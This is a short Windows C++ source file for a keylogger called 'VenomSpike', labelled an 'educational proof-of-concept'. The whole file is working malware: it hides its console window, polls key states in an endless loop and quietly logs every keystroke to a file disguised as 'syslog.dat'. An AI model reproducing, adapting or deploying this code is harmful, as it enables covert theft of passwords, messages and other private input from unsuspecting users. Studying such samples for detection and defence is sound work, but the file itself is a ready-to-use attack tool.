#include <fstream>
#include <stdio.h>
#include <windows.h>


// VenomSpike - User-Mode Keylogger
// Educational Proof-of-Concept
// Captures keystrokes to a hidden file "syslog.dat"

void Stealth() {
  // Hide Console Window
  HWND stealth;
  AllocConsole();
  stealth = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(stealth, 0);
}

void Save(int key, const char *file) {
  FILE *f;
  f = fopen(file, "a+");

  if (f != NULL) {
    if (key == VK_SHIFT)
      fprintf(f, "[SHIFT]");
    else if (key == VK_BACK)
      fprintf(f, "[BACKSPACE]");
    else if (key == VK_LBUTTON)
      fprintf(f, "[LCLICK]");
    else if (key == VK_RETURN)
      fprintf(f, "\n");
    else {
      fprintf(f, "%c", (char)key);
    }
    fclose(f);
  }
}

int main() {
  Stealth();
  char i;
  const char *logFile = "syslog.dat";

  while (TRUE) {
    for (i = 8; i <= 190; i++) {
      if (GetAsyncKeyState(i) == -32767) {
        Save(i, logFile);
      }
    }
  }
  return 0;
}
